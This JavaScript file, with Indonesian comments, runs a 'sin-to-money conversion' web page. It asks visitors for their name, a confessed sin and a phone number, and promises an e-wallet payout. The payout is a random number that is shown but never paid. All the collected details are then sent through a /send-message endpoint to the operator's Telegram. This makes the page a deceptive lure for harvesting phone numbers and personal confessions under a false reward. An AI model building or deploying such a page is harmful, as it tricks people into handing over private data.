let currentStep = 1;
let savedDosa = "";  // Variabel untuk menyimpan dosa
let savedPhone = "";  // Variabel untuk menyimpan nomor telepon
let userName = "";   // Variabel untuk menyimpan nama pengguna

document.getElementById('playButton').addEventListener('click', function() {
    var audio = document.getElementById('backgroundMusic');
    audio.play().catch(function(error) {
        console.log("Audio gagal diputar otomatis:", error);
    });

    // Tampilkan form setelah audio mulai diputar
    document.getElementById('dosaForm').style.display = 'block';
    document.getElementById('playButton').style.display = 'none'; // Sembunyikan tombol play
    document.getElementById('description').innerText = 'Masukkan nama dan dosa Anda untuk melanjutkan.';
});

document.getElementById('nextButton').addEventListener('click', function() {
    if (currentStep === 1) {
        const name = document.getElementById('name').value;
        const dosa = document.getElementById('dosa').value;
        const platform = document.getElementById('platform').value;

        if (name.trim() === "" || dosa.trim() === "") {
            alert("Silakan masukkan nama dan dosa Anda!");
            return;
        }

        // Simpan nama dan dosa untuk ditampilkan nanti
        userName = name;
        savedDosa = dosa;

        // Menampilkan tahap kedua
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('description').innerText = 'Masukkan nomor telepon Anda untuk menerima saldo.';
        document.getElementById('nextButton').innerText = 'Konversi Saldo';

        currentStep++;
    } else if (currentStep === 2) {
        const phone = document.getElementById('phone').value;

        if (phone.trim() === "" || !/^\d{10,}$/.test(phone)) {
            alert("Silakan masukkan nomor telepon yang valid!");
            return;
        }

        // Simpan nomor telepon untuk ditampilkan nanti
        savedPhone = phone;

        // Menyembunyikan form dan tombol
        document.getElementById('step2').style.display = 'none';
        document.getElementById('nextButton').style.display = 'none';
        document.getElementById('description').innerText = 'Memproses konversi...';

        // Menunda tampilan hasil selama 3 detik (3000 ms)
        setTimeout(function() {
            const saldoRupiah = generateSaldo();
            const result = document.getElementById('result');
            result.innerHTML = `
                <p>Nama Anda: <strong>${userName}</strong></p>
                <p>Dosa Anda: <strong>${savedDosa}</strong></p>
                <p>Nomor Telepon: <strong>${savedPhone}</strong></p>
                <p>Saldo yang Anda terima: <strong>${formatRupiah(saldoRupiah)}</strong> akan dikirim ke platform <strong>${document.getElementById('platform').value}</strong>.</p>
                <p class="final-message">"Semoga dosa ini menjadi pelajaran! Jangan lupa top up lagi nanti 😂"</p>
            `;

            document.getElementById('description').innerText = 'Konversi selesai!';

            // Kirim pesan ke Telegram
            sendToTelegram(`Nama: ${userName}\nDosa: ${savedDosa}\nNomor Telepon: ${savedPhone}\nSaldo: ${formatRupiah(saldoRupiah)}`);
        }, 3000); // 3 detik
    }
});

function generateSaldo() {
    const baseSaldo = 10000;  // Setiap dosa memberi 10.000 Rupiah.
    const bonus = Math.floor(Math.random() * 100000);  // Bonus acak hingga 100.000 Rupiah.
    return baseSaldo + bonus;
}

function formatRupiah(amount) {
    return "Rp " + amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}

function sendToTelegram(message) {
    fetch('/send-message', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: message }),
    })
    .then(response => response.json())
    .then(data => console.log('Message sent:', data))
    .catch(error => console.error('Error:', error));
}
